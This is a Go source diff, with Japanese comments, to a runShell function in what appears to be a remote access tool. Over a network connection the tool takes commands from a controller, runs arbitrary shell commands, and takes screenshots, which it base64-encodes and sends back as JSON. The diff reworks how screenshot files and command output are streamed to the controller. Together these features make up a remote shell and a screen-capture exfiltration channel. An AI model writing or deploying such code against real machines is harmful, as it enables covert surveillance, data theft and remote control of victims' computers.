@@ -5,6 +5,7 @@ import (
 	"bytes"
 	"crypto/rand"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"flag"
@@ -172,84 +173,61 @@ func runShell(conn net.Conn) {
 			conn.Write([]byte("Upload Success"))
 
 		case "screenshot": //ex: screenshot
-			//TODO io.Writerに直接書けない？
 			//スクリーンショットを撮影し送信
 			filenames, err := getscreenshot()
 			fmt.Println(filenames)
 			if err != nil {
-				//エラーを返す
+				log.Println(err)
 				continue
 			}
-
-			//終了通知
-			//空の名前、中身で終了
-			//screenshot fin
-			fin := utils.Output{Type: utils.FIN}
-			j, err := json.Marshal(fin)
-			if err != nil {
-				continue
-			}
-			fmt.Println(string(j))
-			conn.Write(j)
 
 			for _, fname := range filenames {
-				//sendFile
 				f, err := os.Open(fname)
 				if err != nil {
 					log.Fatalln(err)
 					break
 				}
 
-				//書き込み
-				//構造体にして送る？
 				fstats, err := f.Stat()
 				if err != nil {
 					log.Fatalln(err)
 					break
 				}
-				name := strings.Split(fname, "/")[2]
-				fileinfo := utils.FileInfo{Name: name, Size: fstats.Size()}
-				output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}
-				j, err := json.Marshal(output)
-				if err != nil {
-					log.Fatalln(err)
-					break
-				}
-				//serverでは、Unmarshalできなくなったら終了
-				fmt.Println(string(j))
-				_, err = conn.Write([]byte(padString(string(j), 1024)))
-				if err != nil {
-					log.Fatalln(err)
-					break
-				}
 
-				//time.Sleep(1 * time.Second)
+				filepath := strings.Split(fname, "/")
+				fileLastname := filepath[len(filepath)-1]
 
-				/*
-					body, err := io.ReadAll(f)
+				var content []byte
+				buff := make([]byte, 1024)
+				size := 0
+
+				for {
+					n, err := f.Read(buff)
 					if err != nil {
-						log.Fatalln(err)
-						break
-					}
-					fmt.Println(string(body))
-				*/
-				//conn.Write(body)
-
-				/*
-					sendBuff := make([]byte, 1024)
-					for {
-						n, err := f.Read(sendBuff)
-						if err != nil {
+						if n == 0 || errors.Is(err, io.EOF) {
 							break
 						}
-						conn.Write(sendBuff[:n])
+						log.Println(err)
+						break
 					}
-				*/
+					//content + bufの中身を一時的に保存。
+					tmp := make([]byte, 0, size+n)
+					tmp = append(content[:size], buff[:n]...)
+					content = tmp
+					size += n
+					if n < 1024 {
+						break
+					}
+				}
 
-				//fileInfoのWriteが消されてしまう
+				imageToBase64 := base64.StdEncoding.EncodeToString(content)
+				fileinfo := utils.FileInfo{Name: "screenshot/" + fileLastname, Body: []byte(imageToBase64), Size: fstats.Size()}
 
-				_, err = io.Copy(conn, f)
+				output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}
+
+				err = json.NewEncoder(conn).Encode(output)
 				if err != nil {
+					log.Fatalln(err)
 					break
 				}
 
@@ -283,15 +261,36 @@ func runShell(conn net.Conn) {
 			out, err := cmd.Output()
 			if err != nil {
 				log.Println(err)
-				return
+				//return
 			}
-			//後で消す
-			fmt.Println(string(out))
-			_, err = conn.Write(out)
+
+			output := utils.Output{Type: utils.MESSAGE, Message: out}
+			/*
+				jsonOut, err := json.Marshal(output)
+				if err != nil {
+					log.Println(err)
+					//return
+				}
+				_, err = conn.Write(jsonOut)
+				if err != nil {
+					log.Println(err)
+					//return
+				}
+			*/
+			err = json.NewEncoder(conn).Encode(output)
 			if err != nil {
 				log.Println(err)
-				return
 			}
+
+			/*
+				//後で消す
+				fmt.Println(string(out))
+				_, err = conn.Write(out)
+				if err != nil {
+					log.Println(err)
+					return
+				}
+			*/
 		}
 	}
 
